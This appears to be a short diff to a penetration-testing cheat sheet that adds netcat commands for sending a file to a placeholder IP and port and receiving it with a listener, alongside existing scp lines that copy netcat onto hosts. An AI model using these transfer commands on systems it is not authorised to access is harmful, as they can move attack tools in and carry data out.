@@ -946,6 +946,14 @@ $ scp nc.exe bob@10.10.1.11:C:\\users\\bob # win example
 $ scp nc alice@10.10.1.11:/tmp             # linux example
 ```
 
+Netcat
+```
+# send - adjust seconds depending on filesize
+cmd> nc -w [seconds] [destination_ip] [port] < [file.txt] 
+# receive
+$ nc -nvlp [port] > [file.txt]
+```
+
 ### Linux
 ```
 ```
